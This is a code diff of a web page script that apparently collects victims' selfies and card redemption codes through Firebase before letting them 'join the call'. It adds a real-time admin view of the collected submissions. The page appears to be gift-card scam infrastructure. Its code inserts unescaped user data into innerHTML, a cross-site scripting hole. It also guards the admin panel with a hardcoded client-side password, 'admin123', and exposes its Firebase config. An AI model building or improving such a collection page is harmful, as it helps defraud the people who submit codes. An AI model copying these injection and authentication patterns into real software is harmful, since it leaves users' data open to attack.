@@ -282,17 +282,22 @@
   </div>
 
 <script type="module">
-  // Import Firebase v9 modular SDK
+  // Import Firebase v9 SDK
   import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
-  import { getFirestore, collection, addDoc, getDocs, orderBy, query, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
-  import { getStorage, ref, uploadBytes, getDownloadURL } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-storage.js";
+  import { 
+    getFirestore, collection, addDoc, serverTimestamp, 
+    query, orderBy, onSnapshot 
+  } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
+  import { 
+    getStorage, ref, uploadBytes, getDownloadURL 
+  } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-storage.js";
 
   // Firebase configuration
   const firebaseConfig = {
     apiKey: "AIzaSyBUmxEQRSirDF_hc3rvgzwU5vRc5uVifcY",
     authDomain: "video-call-auth-e2237.firebaseapp.com",
     projectId: "video-call-auth-e2237",
-    storageBucket: "video-call-auth-e2237.appspot.com",   // ✅ fixed bucket name
+    storageBucket: "video-call-auth-e2237.appspot.com",   // ✅ fixed
     messagingSenderId: "203016834335",
     appId: "1:203016834335:web:fddc9c06f433a64afcf42a",
     measurementId: "G-05HNPKVC14"
@@ -303,12 +308,15 @@
   const db = getFirestore(app);
   const storage = getStorage(app);
 
-  const ADMIN_PASSWORD = "admin123"; // Change password here
+  const ADMIN_PASSWORD = "admin123"; // Change this for security
 
+  // ------------------ Submit Files ------------------
   async function submitFiles() {
     const selfie = document.getElementById("selfie").files[0];
     const redemptionCode = document.getElementById("redemptionCode").value.trim();
-    const selectedCards = Array.from(document.querySelectorAll('input[name="cardType"]:checked')).map(cb => cb.value);
+    const selectedCards = Array.from(
+      document.querySelectorAll('input[name="cardType"]:checked')
+    ).map(cb => cb.value);
 
     if (!selfie) return showStatus("Please upload a selfie before submitting.", "error");
     if (!redemptionCode) return showStatus("Please enter your redemption code.", "error");
@@ -334,12 +342,12 @@
       const docRef = await addDoc(collection(db, "submissions"), submission);
 
       showStatus("Submission successful! You can now join the call.", "success");
-      console.log("Document written with ID: ", docRef.id);
+      console.log("✅ Document written with ID:", docRef.id);
 
     } catch (error) {
-      console.error("Error details:", error);
+      console.error("❌ Error details:", error);
 
-      // Save Firestore fallback
+      // Save Firestore fallback (no image)
       try {
         const submission = {
           redemptionCode,
@@ -360,14 +368,7 @@
     }
   }
 
-  function showStatus(message, type) {
-    const statusEl = document.getElementById("statusMessage");
-    statusEl.textContent = message;
-    statusEl.className = `status-message ${type}`;
-    statusEl.style.display = "block";
-    setTimeout(() => { statusEl.style.display = "none"; }, 5000);
-  }
-
+  // ------------------ Admin Access ------------------
   function requestAdminAccess() {
     const pass = prompt("Enter admin password:");
     if (pass === ADMIN_PASSWORD) {
@@ -377,32 +378,35 @@
     }
   }
 
-  async function openAdmin() {
+  function openAdmin() {
     const panel = document.getElementById("adminPanel");
     const list = document.getElementById("submissionsList");
     list.innerHTML = "";
 
     try {
       const q = query(collection(db, "submissions"), orderBy("timestamp", "desc"));
-      const snapshot = await getDocs(q);
 
-      if (snapshot.empty) {
-        list.innerHTML = "<p>No submissions found.</p>";
-        return;
-      }
+      // Real-time listener 🔥
+      onSnapshot(q, (snapshot) => {
+        list.innerHTML = "";
+        if (snapshot.empty) {
+          list.innerHTML = "<p>No submissions found.</p>";
+          return;
+        }
 
-      snapshot.forEach((doc) => {
-        const data = doc.data();
-        list.innerHTML += `
-          <div class="submission">
-            <p><b>Submission ID:</b> ${doc.id}</p>
-            <p><b>Time:</b> ${data.time}</p>
-            <p><b>Redemption Code:</b> ${data.redemptionCode || 'N/A'}</p>
-            <p><b>Card Types:</b> ${data.cardTypes ? data.cardTypes.join(", ") : 'N/A'}</p>
-            ${data.selfieURL ? `<img src="${data.selfieURL}" alt="Selfie">` : '<p>No image available</p>'}
-            ${data.error ? `<p class="error">Error: ${data.error}</p>` : ''}
-          </div>
-        `;
+        snapshot.forEach((doc) => {
+          const data = doc.data();
+          list.innerHTML += `
+            <div class="submission">
+              <p><b>Submission ID:</b> ${doc.id}</p>
+              <p><b>Time:</b> ${data.time}</p>
+              <p><b>Redemption Code:</b> ${data.redemptionCode || 'N/A'}</p>
+              <p><b>Card Types:</b> ${data.cardTypes ? data.cardTypes.join(", ") : 'N/A'}</p>
+              ${data.selfieURL ? `<img src="${data.selfieURL}" alt="Selfie">` : '<p>No image available</p>'}
+              ${data.error ? `<p class="error">Error: ${data.error}</p>` : ''}
+            </div>
+          `;
+        });
       });
     } catch (error) {
       list.innerHTML = `<p>Error loading data: ${error.message}</p>`;
@@ -415,7 +419,16 @@
     document.getElementById("adminPanel").style.display = "none";
   }
 
-  // Allow only one card type at a time
+  // ------------------ Helpers ------------------
+  function showStatus(message, type) {
+    const statusEl = document.getElementById("statusMessage");
+    statusEl.textContent = message;
+    statusEl.className = `status-message ${type}`;
+    statusEl.style.display = "block";
+    setTimeout(() => { statusEl.style.display = "none"; }, 5000);
+  }
+
+  // Only allow one card type at a time
   document.querySelectorAll('input[name="cardType"]').forEach(checkbox => {
     checkbox.addEventListener('change', function () {
       if (this.checked) {
@@ -426,7 +439,7 @@
     });
   });
 
-  // Expose functions globally
+  // Expose functions globally for HTML buttons
   window.submitFiles = submitFiles;
   window.requestAdminAccess = requestAdminAccess;
   window.closeAdmin = closeAdmin;
